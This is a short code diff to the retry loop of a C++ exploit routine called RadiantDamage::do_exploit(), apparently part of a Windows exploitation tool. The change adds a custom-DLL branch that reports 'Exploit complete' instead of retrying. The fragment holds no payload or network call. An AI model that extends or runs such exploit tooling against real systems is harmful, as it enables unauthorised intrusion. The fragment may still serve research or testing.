@@ -133,9 +133,18 @@ bool RadiantDamage::do_exploit()
 
         if (!std::filesystem::exists("C:\\result.txt"))
         {
-            std::cout << "[-] Failed! Try the exploit again!" << std::endl;
-            std::cout << "[+] Sleep for 3 seconds" << std::endl;
-            std::this_thread::sleep_for(std::chrono::milliseconds(3000));
+            if (m_custom_dll)
+            {
+                // no way to tell if we are done or not
+                std::cout << "[+] Exploit complete." << std::endl;
+                loop = false;
+            }
+            else
+            {
+                std::cout << "[-] Failed! Try the exploit again!" << std::endl;
+                std::cout << "[+] Sleep for 3 seconds" << std::endl;
+                std::this_thread::sleep_for(std::chrono::milliseconds(3000));
+            }
         }
         else
         {
